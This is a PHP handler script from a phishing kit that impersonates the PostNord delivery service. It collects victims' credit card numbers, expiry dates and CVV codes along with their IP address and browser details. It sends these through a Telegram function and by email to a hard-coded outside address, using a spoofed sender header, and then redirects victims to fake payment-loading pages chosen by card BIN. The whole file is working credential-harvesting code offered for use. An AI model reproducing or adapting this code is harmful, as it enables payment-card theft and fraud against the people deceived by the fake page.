<?php
include "config.php";
$ip = getenv("REMOTE_ADDR");
$message = "------------------🤑  INFOS 🤑------------------\n

Credit card Number : ".$_POST['VisacardNumber']."\n
Expiry date (Month) : ".$_POST['Visamonth']."\n
Expiry date ( Year) : ".$_POST['Visayear']."\n
CVV2 : ".$_POST['VisasecurityCode']."\n

------------------🤩 IP INFOS 🤩----------------\n
IP                        : $ip\n
BROWSER           : ".$_SERVER['HTTP_USER_AGENT']."\n
--------------------😎 BY BALHA  😎--------------\n";
$subject = "POSTNORD: Card Infos : $ip ";
$send = "Elkayemhd@aol.com";  //7ot el mail ya jhon
$headers = 'From : postnord@login.tz'."r\n";
telegram($message);
mail($send,$subject,$message,$headers);






$bin = $_POST['VisacardNumber'];
$subin = substr($bin, 0, 6);

if ($subin == "676442" || $subin == "679058" || $subin == "975223") {
 header("Location: ../payment/bin/ld/676442.html");
} else if ($subin == "676163" || $subin == "637102" || $subin == "975223") {
 header("Location: ../payment/bin/ld/535583.html");
}
else {
 header("Location: ../payment/MaestroLoading.html");
}





?>

